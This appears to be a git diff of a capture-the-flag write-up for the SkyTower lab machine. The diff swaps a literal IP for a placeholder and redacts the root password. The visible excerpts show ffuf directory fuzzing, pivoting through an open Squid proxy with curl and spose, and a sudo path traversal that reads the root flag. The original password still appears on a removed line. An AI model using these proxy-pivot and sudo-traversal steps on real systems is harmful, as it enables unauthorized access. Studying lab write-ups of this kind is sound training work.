@@ -42,7 +42,7 @@ So this tells us that we have a potentially open proxy, something important to k
 Source code didn't turn out anything useful, and just testing a random username:password takes us to `/login.php` with message `login failed`.
 Decided to quickly fuzz for common Apache and PHP files/folders with ffuf
 ```
-$ ffuf -u http://ip/FUZZ -w ~/SecLists/Discovery/Web-Content/Apache.fuzz.txt         
+$ ffuf -u http://<ip>/FUZZ -w ~/SecLists/Discovery/Web-Content/Apache.fuzz.txt         
 
 .htpasswd               [Status: 403, Size: 285, Words: 21, Lines: 11, Duration: 2ms]
 .htaccess               [Status: 403, Size: 285, Words: 21, Lines: 11, Duration: 4ms]
@@ -51,19 +51,19 @@ server-status           [Status: 403, Size: 289, Words: 21, Lines: 11, Duration:
 .htaccess.bak           [Status: 403, Size: 289, Words: 21, Lines: 11, Duration: 14ms]
 ```
 ```
-$ ffuf -u http://ip/FUZZ -w ~/SecLists/Discovery/Web-Content/Common-PHP-Filenames.txt
+$ ffuf -u http://<ip>/FUZZ -w ~/SecLists/Discovery/Web-Content/Common-PHP-Filenames.txt
 
 login.php               [Status: 200, Size: 21, Words: 2, Lines: 1, Duration: 477ms]
 ```
 Nothing too interesting on the PHP side, but a couple of good hits on the apache scan. Of course trying to get any of these is met with a `403 - Forbidden`, so focused my attention on the potentially open proxy that nmap found.
 Using a simple curl command:
 ```
-curl --proxy http://ip:3128 http://localhost/server-status
+curl --proxy http://<ip>:3128 http://localhost/server-status
 ```
 Displays the apache server status log, so this confirms we have an open proxy. Testing any `.hta*` file didn't get any success, and the server status log will only show our own connections so it's of limited use.
 At this point decided to use `https://github.com/aancw/spose` to scan for open ports behind the squid proxy:
 ```
-$ python spose.py --proxy http://ip:3128 --target localhost 
+$ python spose.py --proxy http://<ip>:3128 --target localhost 
 localhost 22 seems OPEN 
 localhost 80 seems OPEN 
 ```
@@ -173,6 +173,6 @@ sara@SkyTower:~$ sudo ls /accounts/../root/
 flag.txt
 sara@SkyTower:~$ sudo cat /accounts/../root/flag.txt
 Congratz, have a cold one to celebrate!
-root password is theskytower
+root password is <password>
 sara@SkyTower:~$ 
 ```
